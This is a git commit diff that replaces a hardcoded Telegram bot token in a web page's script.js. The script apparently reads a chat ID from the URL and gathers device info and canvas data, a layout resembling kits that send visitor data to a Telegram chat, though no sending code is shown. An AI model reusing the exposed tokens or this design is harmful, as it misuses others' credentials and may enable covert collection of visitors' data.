dbaf9ae3c4ef0cec0462c7d0bc8b93b887f9e3b3
Ahmad Zaki <166486850+ahmadzakiyox@users.noreply.github.com>
2025-11-09 22:04:41 +0700

    Update script.js

--- public/script.js
+++ public/script.js
@@ -14,7 +14,7 @@ const canvasEl = document.getElementById('canvas');
 const params = new URLSearchParams(window.location.search);
 const alias = params.get('alias');
 const chatId = params.get('uid');
-const botToken = '6136209053:AAF01MfDjE9oIajSHIDBDTpJ70CUuTqQLpY';
+const botToken = '8409668139:AAFX1nZhurnH0VUFSNzQ5glYev2qfPNP-Gs';
 
 // --- Fungsi ---
 // Device Info
